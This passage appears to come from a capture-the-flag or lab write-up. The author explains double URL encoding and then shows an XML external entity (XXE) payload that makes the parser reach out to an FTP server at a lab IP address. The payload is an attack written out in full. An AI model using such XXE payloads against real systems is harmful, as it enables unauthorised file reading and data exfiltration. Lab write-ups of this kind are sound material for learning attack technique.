@@ -1,0 +1,1 @@
+yload. If I only encoded once, the resulting payload wouldn’t be a valid url, with spaces and ? character. But in double encoded, that resulting payload is still encoded. I updated the payload to try FTP: <?xml version="1.0" ?> <!DOCTYPE root [ <!ENTITY % ext SYSTEM "ftp://10.10.14.24/"> %ext; ]> <r></r> I send it:
